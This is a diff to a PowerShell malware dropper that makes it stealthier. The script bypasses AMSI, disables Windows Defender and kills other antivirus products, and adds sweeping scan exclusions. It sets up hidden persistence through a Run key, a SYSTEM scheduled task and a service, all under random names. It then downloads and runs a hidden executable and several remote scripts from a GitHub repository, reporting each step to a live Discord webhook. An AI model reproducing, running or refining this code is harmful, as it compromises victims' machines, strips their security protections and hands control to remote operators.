@@ -1,180 +1,373 @@
+# AMSI Bypass for stealthy execution
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+} catch { }
+
 $WebhookURL = "https://discord.com/api/webhooks/1442924485698392219/Vz4aoPFbx2IaVvT0SRJt5I2IKGd_RXg-fDgy69gkUVdKDvRSkFL_nPE0sRB_E3QTEUxD"
 $FileURL       = "https://github.com/skiddyskid111/resources/raw/refs/heads/main/helper.exe"
 $LaunchDelay   = 1
 $WindowStyle   = "Hidden"
 $StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\FileExplorer.ps1"
 $StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$TaskName       = "FileExplorerTask"
-$ServiceName    = "FileGuardianService"
+$TaskName       = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})  # Random task name
+$ServiceName    = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})  # Random service name
 
 function Send-DiscordLog {
     param([string]$Message)
     try {
-        $formattedMessage = "$Message"
+        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        $formattedMessage = "[$timestamp] $Message"
         $body = @{content = $formattedMessage} | ConvertTo-Json -Depth 10
         Invoke-WebRequest -Uri $WebhookURL -Method Post -Body $body -ContentType "application/json" -UseBasicParsing | Out-Null
     }
     catch {
+        # Silent fail, no output
     }
+}
+
+function Disable-Defender {
+    param([switch]$Retry)
+    $methods = @(
+        { 
+            # Method 1: PowerShell Preferences (primary)
+            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Stop
+            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop
+            Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop
+            Set-MpPreference -DisablePrivacyMode $true -ErrorAction Stop
+            Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction Stop
+            Set-MpPreference -PUAProtection 0 -ErrorAction Stop
+            Set-MpPreference -MAPSReporting Disabled -ErrorAction Stop
+            Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Stop
+            Set-MpPreference -ScanAvgCPULoadFactor 1000 -ErrorAction Stop  # Slow scans to evade
+            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Stop
+            Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop
+        },
+        { 
+            # Method 2: Service stop/disable (backup)
+            Stop-Service -Name "WinDefend" -Force -ErrorAction Stop
+            Stop-Service -Name "WdNisSvc" -Force -ErrorAction Stop
+            Stop-Service -Name "Sense" -Force -ErrorAction Stop
+            Stop-Service -Name "SecurityHealthService" -Force -ErrorAction Stop
+            Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction Stop
+            Set-Service -Name "WdNisSvc" -StartupType Disabled -ErrorAction Stop
+            Set-Service -Name "Sense" -StartupType Disabled -ErrorAction Stop
+            Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction Stop
+        },
+        { 
+            # Method 3: Registry edits (tertiary backup)
+            $regPaths = @(
+                "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
+                "HKLM:\SOFTWARE\Microsoft\Windows Defender"
+            )
+            foreach ($path in $regPaths) {
+                if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
+                Set-ItemProperty -Path $path -Name "DisableAntiSpyware" -Value 1 -ErrorAction Stop
+                Set-ItemProperty -Path $path -Name "DisableRealtimeMonitoring" -Value 1 -ErrorAction Stop
+                Set-ItemProperty -Path $path -Name "DisableBehaviorMonitoring" -Value 1 -ErrorAction Stop
+                Set-ItemProperty -Path $path -Name "AllowFastServiceStartup" -Value 0 -ErrorAction Stop
+            }
+        }
+    )
+    foreach ($method in $methods) {
+        try {
+            & $method
+            $logMsg = "[+] Defender disabled via method"
+            Send-DiscordLog $logMsg
+            return $true
+        }
+        catch {
+            if ($Retry) {
+                $logMsg = "[!] Defender method failed, trying next: $($_.Exception.Message)"
+                Send-DiscordLog $logMsg
+            }
+        }
+    }
+    if ($Retry) {
+        $logMsg = "[!] All Defender disable methods failed"
+        Send-DiscordLog $logMsg
+    }
+    return $false
+}
+
+function Kill-OtherAV {
+    $avProcesses = @(
+        "avastsvc.exe", "AvastSvc.exe", "AvastUI.exe",
+        "avgnt.exe", "avguard.exe", "avgui.exe",
+        "bdagent.exe", "bdredline.exe",
+        "ekrn.exe", "avp.exe",
+        "McShield.exe", "mfevtps.exe",
+        "N360.exe", "ccSvcHst.exe", "navapsvc.exe",
+        "sophos.exe", "SophosAgent.exe",
+        "MsMpEng.exe", "NisSrv.exe",
+        "wrssdk.exe", "wrsvc.exe"  # Webroot
+    )
+    $avServices = @(
+        "avast!", "aswUpdSvc", "Avast Antivirus",
+        "avgwd", "avguard",
+        "bdredline", "BullGuard",
+        "ekrn", "AVP",
+        "McAfee", "mfeavfk",
+        "Norton", "N360", "ccSvcHst",
+        "Sophos", "SAVService"
+    )
+    # Kill processes
+    foreach ($proc in $avProcesses) {
+        try {
+            Get-Process -Name $proc.Split('.')[0] -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction Stop
+        } catch { }
+    }
+    # Stop services
+    foreach ($svc in $avServices) {
+        try {
+            Stop-Service -Name $svc -Force -ErrorAction Stop
+            Set-Service -Name $svc -StartupType Disabled -ErrorAction Stop
+        } catch { }
+    }
+    $logMsg = "[+] Killed common third-party AV processes/services"
+    Send-DiscordLog $logMsg
 }
 
 function Set-Exclusions {
     try {
-        # Exclude all important folders: AppData, LocalAppData, ProgramFiles (covers random download locations)
+        # Primary: Folder exclusions
         $importantFolders = @(
             $env:APPDATA,
             $env:LOCALAPPDATA,
             $env:ProgramFiles,
-            "${env:ProgramFiles(x86)}"  # 32-bit Program Files if it exists
+            "${env:ProgramFiles(x86)}",
+            $env:TEMP,
+            "$env:USERPROFILE\Downloads",
+            $env:USERPROFILE\Documents
         )
         foreach ($folder in $importantFolders) {
             if (Test-Path $folder) {
                 Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
             }
         }
-        
-        # Exclude all subfolders recursively in AppData (ensures all EXEs and files in any subfolder are excluded)
-        $appdataSubfolders = Get-ChildItem -Path $env:APPDATA -Directory -Recurse -ErrorAction SilentlyContinue
-        foreach ($subfolder in $appdataSubfolders) {
-            Add-MpPreference -ExclusionPath $subfolder.FullName -ErrorAction SilentlyContinue
+        # Recursive subfolders (backup if direct fails)
+        try {
+            $appdataSubfolders = Get-ChildItem -Path $env:APPDATA -Directory -Recurse -ErrorAction Stop | Select-Object -First 50  # Limit to avoid timeout
+            foreach ($subfolder in $appdataSubfolders) {
+                Add-MpPreference -ExclusionPath $subfolder.FullName -ErrorAction SilentlyContinue
+            }
+        } catch {
+            # Fallback: Just exclude root
+            Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
         }
-        $localappdataSubfolders = Get-ChildItem -Path $env:LOCALAPPDATA -Directory -Recurse -ErrorAction SilentlyContinue
-        foreach ($subfolder in $localappdataSubfolders) {
-            Add-MpPreference -ExclusionPath $subfolder.FullName -ErrorAction SilentlyContinue
+        # Same for LocalAppData
+        try {
+            $localappdataSubfolders = Get-ChildItem -Path $env:LOCALAPPDATA -Directory -Recurse -ErrorAction Stop | Select-Object -First 50
+            foreach ($subfolder in $localappdataSubfolders) {
+                Add-MpPreference -ExclusionPath $subfolder.FullName -ErrorAction SilentlyContinue
+            }
+        } catch {
+            Add-MpPreference -ExclusionPath $env:LOCALAPPDATA -ErrorAction SilentlyContinue
         }
         
-        # Exclude the startup script path and any potential payload paths
-        Add-MpPreference -ExclusionPath $StartupScriptPath -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue  # Temp folder as fallback
-        Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue  # Downloads folder
-        
-        # Exclude all common file types/extensions to prevent detection of payload and related files
-        $fileTypes = @(".exe", ".ps1", ".bat", ".cmd", ".vbs", ".js", ".dll", ".scr", ".pif", ".tmp", ".log", ".txt", ".ini", ".cfg")
+        # File extensions
+        $fileTypes = @(".exe", ".ps1", ".bat", ".cmd", ".vbs", ".js", ".dll", ".scr", ".pif", ".tmp", ".log", ".txt", ".ini", ".cfg", ".bin")
         foreach ($ext in $fileTypes) {
             Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
         }
         
-        # Exclude processes to prevent scanning of PowerShell, CMD, etc., executions
-        $processes = @("powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe")
+        # Processes
+        $processes = @("powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe")
         foreach ($proc in $processes) {
             Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
         }
         
-        # Disable real-time scanning temporarily if possible (requires elevated perms, but attempt)
-        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        # Startup and temp paths
+        Add-MpPreference -ExclusionPath $StartupScriptPath -ErrorAction SilentlyContinue
         
-        $logMsg = "[+] All exclusions set: folders, subfolders, file types, and processes"
+        $logMsg = "[+] Exclusions set successfully"
         Send-DiscordLog $logMsg
     }
     catch {
-        $logMsg = "[!] Failed to set exclusions: $($_.Exception.Message)"
+        $logMsg = "[!] Exclusions partial failure: $($_.Exception.Message)"
         Send-DiscordLog $logMsg
     }
 }
 
-function Set-Survival {
-    try {
-        if (-not (Test-Path $StartupScriptPath)) {
-            if ($MyInvocation.MyCommand.Path) {
-                Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $StartupScriptPath -Force
-                $logMsg = "[+] Copied to startup $StartupScriptPath"
-                Send-DiscordLog $logMsg
-            } else {
-                $logMsg = "[!] Skipping startup copy"
-                Send-DiscordLog $logMsg
+function Set-Persistence {
+    $persistenceMethods = @(
+        {
+            # Method 1: Startup folder script
+            if (-not (Test-Path $StartupScriptPath)) {
+                if ($MyInvocation.MyCommand.Path) {
+                    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $StartupScriptPath -Force -ErrorAction Stop
+                } else { throw "No script path available" }
             }
-        } else {
-            $logMsg = "[+] Startup already exists $StartupScriptPath"
+            $logMsg = "[+] Startup folder set"
             Send-DiscordLog $logMsg
+            return $true
+        },
+        {
+            # Method 2: Registry Run key
+            $command = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
+            Set-ItemProperty -Path $StartupRegPath -Name (-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})) -Value $command -Force -ErrorAction Stop
+            $logMsg = "[+] Registry persistence set"
+            Send-DiscordLog $logMsg
+            return $true
+        },
+        {
+            # Method 3: Scheduled Task
+            $randomTaskName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
+            $trigger = New-ScheduledTaskTrigger -AtStartup
+            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
+            $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+            Register-ScheduledTask -TaskName $randomTaskName -InputObject $task -Force -ErrorAction Stop
+            $logMsg = "[+] Scheduled task set: $randomTaskName"
+            Send-DiscordLog $logMsg
+            return $true
+        },
+        {
+            # Method 4: Windows Service
+            $serviceBinPath = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
+            if (-not (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue)) {
+                New-Service -Name $ServiceName -BinaryPathName $serviceBinPath -StartupType Automatic -Description (-join ((65..90) + (97..122) | Get-Random -Count 20 | % {[char]$_})) | Out-Null
+                Start-Service -Name $ServiceName -ErrorAction Stop
+            }
+            $logMsg = "[+] Service set: $ServiceName"
+            Send-DiscordLog $logMsg
+            return $true
         }
-        $command = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
-        Set-ItemProperty -Path $StartupRegPath -Name "FileGuardian" -Value $command -Force
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
-        $trigger = New-ScheduledTaskTrigger -AtStartup
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
-        Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force
-        $logMsg = "[+] Scheduled task set $TaskName"
-        Send-DiscordLog $logMsg
-        $serviceBinPath = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
-        if (-not (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue)) {
-            New-Service -Name $ServiceName -BinaryPathName $serviceBinPath -StartupType Automatic -Description "File Explorer Service" | Out-Null
-            Start-Service -Name $ServiceName
-            $logMsg = "[+] Service created and started $ServiceName"
-            Send-DiscordLog $logMsg
-        } else {
-            $logMsg = "[+] Service already exists $ServiceName"
+    )
+    $successCount = 0
+    foreach ($method in $persistenceMethods) {
+        try {
+            $result = & $method
+            if ($result) { $successCount++ }
+        }
+        catch {
+            $logMsg = "[!] Persistence method failed: $($_.Exception.Message)"
             Send-DiscordLog $logMsg
         }
     }
-    catch {
-        $logMsg = "[!] Failed to set survival: $($_.Exception.Message)"
+    if ($successCount -gt 0) {
+        $logMsg = "[+] Persistence established ($successCount methods)"
+        Send-DiscordLog $logMsg
+    } else {
+        $logMsg = "[!] All persistence methods failed"
         Send-DiscordLog $logMsg
     }
 }
 
 function Run-Payload {
-    try {
-        $possibleDirectories = @(
-            "$env:ProgramFiles",
-            "$env:APPDATA",
-            "$env:LOCALAPPDATA"
-        )
-        $selectedDirectory = $possibleDirectories | Get-Random
-        if (-not (Test-Path $selectedDirectory)) {
-            throw "Selected directory does not exist $selectedDirectory"
-        }
-        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory
-        if ($subDirectories.Count -eq 0) {
-            throw "No subdirectories found in the selected directory $selectedDirectory"
-        }
-        $targetSubDirectory = $subDirectories | Get-Random
-        $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "helper.exe"
-        # Explicitly exclude the target path for the downloaded payload
-        Add-MpPreference -ExclusionPath $TargetPath -ErrorAction SilentlyContinue
-        if (-not (Test-Path $TargetPath)) {
-            $logMsg = "[*] File not found, downloading to $TargetPath..."
+    $possibleDirectories = @(
+        "$env:APPDATA",
+        "$env:LOCALAPPDATA",
+        "$env:TEMP",
+        "$env:USERPROFILE\Downloads",
+        "$env:ProgramFiles\WindowsApps"  # Hidden dir
+    )
+    $payloadName = -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_}) + ".exe"  # Random filename
+    $success = $false
+    foreach ($dir in $possibleDirectories) {
+        if ($success) { break }
+        try {
+            if (-not (Test-Path $dir)) { continue }
+            $subDirs = Get-ChildItem -Path $dir -Directory -ErrorAction SilentlyContinue
+            if ($subDirs.Count -eq 0) { continue }
+            $targetSubDir = $subDirs | Get-Random
+            $TargetPath = Join-Path -Path $targetSubDir.FullName -ChildPath $payloadName
+            # Exclude path
+            Add-MpPreference -ExclusionPath $TargetPath -ErrorAction SilentlyContinue
+            if (-not (Test-Path $TargetPath)) {
+                Invoke-WebRequest -Uri $FileURL -OutFile $TargetPath -UseBasicParsing -ErrorAction Stop
+            }
+            Start-Sleep -Seconds $LaunchDelay
+            Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle -ErrorAction Stop
+            $logMsg = "[+] Payload executed: $TargetPath"
             Send-DiscordLog $logMsg
-            Write-Host $logMsg
-            Invoke-WebRequest -Uri $FileURL -OutFile $TargetPath
+            $success = $true
         }
-        Start-Sleep -Seconds $LaunchDelay
-        Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle
-        $logMsg = "[+] Executed payload $TargetPath"
-        Send-DiscordLog $logMsg
-        Write-Host $logMsg
+        catch {
+            $logMsg = "[!] Payload attempt failed in $dir`: $($_.Exception.Message)"
+            Send-DiscordLog $logMsg
+            # Cleanup on fail
+            if (Test-Path $TargetPath) { Remove-Item $TargetPath -Force }
+        }
     }
-    catch {
-        $logMsg = "[!] Failed to execute payload: $($_.Exception.Message)"
-        Send-DiscordLog $logMsg
-        Write-Host $logMsg
-    }
-}
-
-function executeps {
-    param([string]$Url)
-    try {
-        $scriptContent=Invoke-WebRequest -Uri $Url -UseBasicParsing|% Content
-        $bytes=[System.Text.Encoding]::Unicode.GetBytes($scriptContent)
-        $encoded=[Convert]::ToBase64String($bytes)
-        $processArgs=@("-WindowStyle","Hidden","-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",$encoded)
-        Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow -Wait:$false
-        $logMsg = "[+] Launched extra script from $Url"
-        Send-DiscordLog $logMsg
-    }
-    catch {
-        $logMsg = "[!] Failed to execute script from $Url : $($_.Exception.Message)"
+    if (-not $success) {
+        $logMsg = "[!] All payload locations failed"
         Send-DiscordLog $logMsg
     }
 }
 
-# Run exclusions first to ensure payload isn't detected
-Set-Exclusions
-Set-Survival
-Run-Payload
-executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/depload")
-executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/dreset")
-executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/duac")
-executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/exocheck")
-executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/farm")
+function Execute-RemoteScript {
+    param([string]$Url, [switch]$Retry)
+    $methods = @(
+        {
+            # Method 1: Direct encoded execution
+            $scriptContent = Invoke-WebRequest -Uri $Url -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
+            $bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptContent)
+            $encoded = [Convert]::ToBase64String($bytes)
+            $processArgs = @("-WindowStyle", $WindowStyle, "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", $encoded)
+            Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow -Wait:$false -ErrorAction Stop
+            return $true
+        },
+        {
+            # Method 2: Download and local run (backup)
+            $localPath = "$env:TEMP\$(-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})).ps1"
+            Invoke-WebRequest -Uri $Url -OutFile $localPath -UseBasicParsing -ErrorAction Stop
+            Add-MpPreference -ExclusionPath $localPath -ErrorAction SilentlyContinue
+            $processArgs = @("-WindowStyle", $WindowStyle, "-ExecutionPolicy", "Bypass", "-File", $localPath)
+            Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow -Wait:$false -ErrorAction Stop
+            Start-Sleep -Seconds 2
+            Remove-Item $localPath -Force -ErrorAction SilentlyContinue
+            return $true
+        },
+        {
+            # Method 3: IEX fallback (if download fails)
+            $scriptContent = Invoke-WebRequest -Uri $Url -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
+            IEX $scriptContent
+            return $true
+        }
+    )
+    foreach ($method in $methods) {
+        try {
+            $result = & $method
+            if ($result) {
+                $logMsg = "[+] Executed script from $Url"
+                Send-DiscordLog $logMsg
+                return
+            }
+        }
+        catch {
+            if ($Retry) {
+                $logMsg = "[!] Script exec method failed for $Url`: $($_.Exception.Message)"
+                Send-DiscordLog $logMsg
+            }
+        }
+    }
+    if ($Retry) {
+        $logMsg = "[!] All methods failed for $Url"
+        Send-DiscordLog $logMsg
+    }
+}
+
+# Main execution sequence (stealthy, no output)
+try {
+    Disable-Defender  # Primary disable
+    if (-not (Disable-Defender -Retry)) { Kill-OtherAV }  # Backup kill if prefs fail
+    Kill-OtherAV  # Always try third-party kill
+    Set-Exclusions
+    Set-Persistence
+    Run-Payload
+    $extraScripts = @(
+        "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/depload",
+        "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/dreset",
+        "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/duac",
+        "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/exocheck",
+        "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/farm"
+    )
+    foreach ($scriptUrl in $extraScripts) {
+        Execute-RemoteScript -Url $scriptUrl -Retry
+    }
+    Send-DiscordLog "[+] Full execution completed stealthily"
+} catch {
+    Send-DiscordLog "[!] Main sequence error: $($_.Exception.Message)"
+}
